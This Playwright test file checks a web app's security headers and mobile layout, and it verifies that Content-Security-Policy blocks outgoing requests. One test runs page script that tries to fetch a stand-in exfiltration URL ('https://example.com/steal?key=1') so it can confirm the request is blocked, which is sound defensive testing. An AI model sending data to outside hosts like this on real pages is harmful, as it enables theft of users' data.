/**
 * Security behaviour in a real browser. Uses the plain Playwright test, not the
 * guard, because the exfiltration check DELIBERATELY triggers a CSP violation.
 */
import { expect, test } from '@playwright/test';

test('the production server sends the security headers', async ({ request }) => {
  const res = await request.get('/');
  const csp = res.headers()['content-security-policy'] ?? '';
  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("connect-src 'none'");
  expect(csp).not.toContain('unsafe-inline');
  expect(res.headers()['x-frame-options']).toBe('DENY');
  expect(res.headers()['x-content-type-options']).toBe('nosniff');
});

test('the page cannot send data anywhere, even when script tries', async ({ page }) => {
  const violations: string[] = [];
  await page.exposeFunction('__reportCsp', (d: string) => violations.push(d));
  await page.addInitScript(() => {
    document.addEventListener('securitypolicyviolation', (e) => (window as unknown as { __reportCsp: (d: string) => void }).__reportCsp(e.violatedDirective));
  });
  await page.goto('/', { waitUntil: 'domcontentloaded' });
  for (const url of ['https://example.com/steal?key=1', '/same-origin']) {
    const outcome = await page.evaluate((u) => fetch(u).then(() => 'sent', () => 'blocked'), url);
    expect(outcome, url).toBe('blocked');
  }
  expect(violations.filter((v) => v.startsWith('connect-src')).length).toBe(2);
});

for (const view of ['Lab bench', 'Trust chain', 'Attack bench', 'Verifier desk'] as const) {
  test(`${view} fits a 390 px phone screen`, async ({ browser }) => {
    const page = await browser.newPage({ viewport: { width: 390, height: 844 } });
    await page.goto('/', { waitUntil: 'domcontentloaded' });
    await page.getByRole('navigation', { name: 'Sections' }).getByRole('button', { name: view }).click();
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth > window.innerWidth);
    expect(overflow).toBe(false);
    await page.close();
  });
}
